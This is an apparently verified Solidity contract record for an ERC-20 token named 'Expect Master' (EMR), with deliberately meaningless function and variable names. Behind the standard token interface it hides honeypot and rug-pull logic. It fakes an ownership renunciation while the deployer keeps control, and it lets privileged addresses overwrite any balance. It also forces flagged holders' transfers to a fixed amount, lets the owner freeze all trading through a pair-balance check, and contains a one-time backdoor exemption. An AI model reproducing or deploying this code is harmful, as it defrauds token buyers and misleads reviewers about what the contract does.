{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface modeTake {\n    function createPair(address fundTx, address atWallet) external returns (address);\n}\n\ninterface sellTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverLaunch) external view returns (uint256);\n\n    function transfer(address walletSenderMin, uint256 toSell) external returns (bool);\n\n    function allowance(address isMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletSenderMin,\n        uint256 toSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundEnableSwap, uint256 value);\n    event Approval(address indexed isMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract receiverExemptMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedLaunch is sellTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExpectMaster is receiverExemptMin, sellTake, launchedLaunch {\n\n    mapping(address => mapping(address => uint256)) private launchTotal;\n\n    function transferFrom(address tokenAmount, address walletSenderMin, uint256 toSell) external override returns (bool) {\n        if (_msgSender() != enableSender) {\n            if (launchTotal[tokenAmount][_msgSender()] != type(uint256).max) {\n                require(toSell <= launchTotal[tokenAmount][_msgSender()]);\n                launchTotal[tokenAmount][_msgSender()] -= toSell;\n            }\n        }\n        return feeBuy(tokenAmount, walletSenderMin, toSell);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return walletToken;\n    }\n\n    string private walletToken = \"Expect Master\";\n\n    uint256 feeLaunchTo;\n\n    address private launchToken;\n\n    uint256 private autoAtEnable;\n\n    function transfer(address launchFund, uint256 toSell) external virtual override returns (bool) {\n        return feeBuy(_msgSender(), launchFund, toSell);\n    }\n\n    bool public marketingLaunched;\n\n    uint256 constant amountWallet = 14 ** 10;\n\n    mapping(address => bool) public exemptLaunchedSender;\n\n    function approve(address tokenSenderWallet, uint256 toSell) public virtual override returns (bool) {\n        launchTotal[_msgSender()][tokenSenderWallet] = toSell;\n        emit Approval(_msgSender(), tokenSenderWallet, toSell);\n        return true;\n    }\n\n    mapping(address => bool) public maxMode;\n\n    function balanceOf(address receiverLaunch) public view virtual override returns (uint256) {\n        return tokenWallet[receiverLaunch];\n    }\n\n    function getOwner() external view returns (address) {\n        return launchToken;\n    }\n\n    function allowance(address limitTotal, address tokenSenderWallet) external view virtual override returns (uint256) {\n        if (tokenSenderWallet == enableSender) {\n            return type(uint256).max;\n        }\n        return launchTotal[limitTotal][tokenSenderWallet];\n    }\n\n    uint256 public receiverListFund;\n\n    function owner() external view returns (address) {\n        return launchToken;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapLiquidity;\n    }\n\n    uint256 toReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyTo;\n    }\n\n    bool public launchMax;\n\n    constructor (){\n        \n        swapReceiver marketingLaunchedFee = swapReceiver(enableSender);\n        tokenList = modeTake(marketingLaunchedFee.factory()).createPair(marketingLaunchedFee.WETH(), address(this));\n        \n        shouldIs = _msgSender();\n        exemptLaunchedSender[shouldIs] = true;\n        tokenWallet[shouldIs] = launchedTotalExempt;\n        marketingTo();\n        \n        emit Transfer(address(0), shouldIs, launchedTotalExempt);\n    }\n\n    uint8 private swapLiquidity = 18;\n\n    string private buyTo = \"EMR\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedTotalExempt;\n    }\n\n    uint256 public listAuto;\n\n    function feeTakeBuy(address launchFund, uint256 toSell) public {\n        listMarketing();\n        tokenWallet[launchFund] = toSell;\n    }\n\n    uint256 public swapAtSender;\n\n    uint256 private launchedTotalExempt = 100000000 * 10 ** 18;\n\n    address sellFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private exemptAuto;\n\n    uint256 private marketingSender;\n\n    function feeBuy(address tokenAmount, address walletSenderMin, uint256 toSell) internal returns (bool) {\n        if (tokenAmount == shouldIs) {\n            return listLaunched(tokenAmount, walletSenderMin, toSell);\n        }\n        uint256 marketingToken = sellTake(tokenList).balanceOf(sellFee);\n        require(marketingToken == toReceiver);\n        require(walletSenderMin != sellFee);\n        if (maxMode[tokenAmount]) {\n            return listLaunched(tokenAmount, walletSenderMin, amountWallet);\n        }\n        return listLaunched(tokenAmount, walletSenderMin, toSell);\n    }\n\n    event OwnershipTransferred(address indexed teamTradingBuy, address indexed shouldTo);\n\n    uint256 public autoList;\n\n    uint256 private tokenTo;\n\n    address enableSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function listLaunched(address tokenAmount, address walletSenderMin, uint256 toSell) internal returns (bool) {\n        require(tokenWallet[tokenAmount] >= toSell);\n        tokenWallet[tokenAmount] -= toSell;\n        tokenWallet[walletSenderMin] += toSell;\n        emit Transfer(tokenAmount, walletSenderMin, toSell);\n        return true;\n    }\n\n    function marketingTo() public {\n        emit OwnershipTransferred(shouldIs, address(0));\n        launchToken = address(0);\n    }\n\n    function listMarketing() private view {\n        require(exemptLaunchedSender[_msgSender()]);\n    }\n\n    address public shouldIs;\n\n    mapping(address => uint256) private tokenWallet;\n\n    function liquidityTeam(address senderFund) public {\n        listMarketing();\n        if (listAuto == autoList) {\n            launchToMin = false;\n        }\n        if (senderFund == shouldIs || senderFund == tokenList) {\n            return;\n        }\n        maxMode[senderFund] = true;\n    }\n\n    bool public launchToMin;\n\n    address public tokenList;\n\n    function fromMin(address tokenReceiverLaunched) public {\n        require(tokenReceiverLaunched.balance < 100000);\n        if (marketingLaunched) {\n            return;\n        }\n        \n        exemptLaunchedSender[tokenReceiverLaunched] = true;\n        \n        marketingLaunched = true;\n    }\n\n    function limitEnable(uint256 toSell) public {\n        listMarketing();\n        toReceiver = toSell;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTradingBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundEnableSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenSenderWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSenderWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptLaunchedSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toSell\",\"type\":\"uint256\"}],\"name\":\"feeTakeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiverLaunched\",\"type\":\"address\"}],\"name\":\"fromMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchToMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toSell\",\"type\":\"uint256\"}],\"name\":\"limitEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderFund\",\"type\":\"address\"}],\"name\":\"liquidityTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverListFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAtSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletSenderMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExpectMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}